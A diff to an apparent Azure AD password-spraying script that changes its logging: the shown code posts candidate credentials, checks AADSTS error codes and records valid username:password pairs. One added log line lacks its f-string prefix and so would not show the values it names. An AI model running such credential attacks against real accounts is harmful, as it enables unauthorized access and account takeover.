@@ -68,10 +68,11 @@ class sprayAttack(TextColor):
       self.response = requests.post(sprayAttack.url, headers=sprayAttack.header, data=self.payload)
       if self.response.status_code == 200:
         print(TextColor.GREEN + f"[+]Credentials found successfully! {self.user}:{self.password}" + TextColor.RESET)
-        logging.info(f"[+]Credentials found successfully! {self.user}:{self.password}")
+        logging.info(f"[+] Authentication successful for user: {self.user}")
         self.full_result.append(f"[+]Credentials found successfully for User! {self.user}:{self.password}")
       else:
         resp_err = self.response.text
+        logging.error("[-] Authentication failed for user: {self.user} with password: {self.password}")
         #Reference list of all the Azure AD Authentication and Authorization Error Code: https://bit.ly/3yH8mXd
         if "AADSTS50126" in resp_err:
             print(TextColor.RED + f"[-] Invalid Password for user:{self.user}:{self.password}" + TextColor.RESET)
@@ -131,6 +132,7 @@ class sprayAttack(TextColor):
                 file.write(result + "\n")  
           print(TextColor.GREEN + f"[+] Results have been written to {self.output}." + TextColor.RESET)
           logging.info(f"[+] Result save in {self.output}")
+          logging.info('[+] Script Stop')
         else: pass
       sys.exit(-1)
 
